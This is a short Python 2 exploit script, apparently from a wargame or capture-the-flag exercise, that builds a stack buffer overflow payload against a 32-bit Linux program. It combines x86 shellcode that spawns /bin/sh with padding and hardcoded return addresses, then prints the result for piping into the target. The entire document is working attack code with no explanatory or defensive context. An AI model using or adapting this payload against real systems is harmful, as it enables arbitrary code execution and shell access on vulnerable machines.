import struct
shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
pad = 'A'*(76-len(shellcode))
minpad = 'A'*4
ret1 = struct.pack('<I',0x08048507) 
ret2 = struct.pack('<I',0xbffff77c)
print shellcode+pad+minpad+ret1+minpad+ret2

